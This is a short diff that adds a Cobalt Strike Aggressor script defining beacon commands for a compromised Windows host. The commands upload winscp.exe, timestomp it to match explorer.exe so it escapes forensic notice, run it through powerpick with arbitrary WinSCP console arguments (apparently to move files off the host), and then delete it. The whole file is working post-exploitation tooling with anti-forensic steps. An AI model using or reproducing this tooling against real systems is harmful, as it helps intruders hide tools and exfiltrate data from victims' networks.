@@ -1,0 +1,21 @@
+include(script_resource("utils.cna"));
+
+# TODO use bupload_raw to put it somewhere else
+alias winscp-init {
+	$bid = $1;
+	blog($bid, 'Uploading winscp.exe');
+	bupload($bid, script_resource('tools/winscp.exe'));
+	explorerstomp($bid, 'winscp.exe');
+}
+
+alias winscp {
+	$bid = $1;
+	shift(@_);
+	$line = join(' ', @_);
+	bpowerpick!($bid, "echo 'winscp starting'; ./winscp.exe /console $line ; echo 'winscp finished';");
+}
+
+alias winscp-stop {
+	$bid = $1;
+	brm($bid, 'winscp.exe');
+}
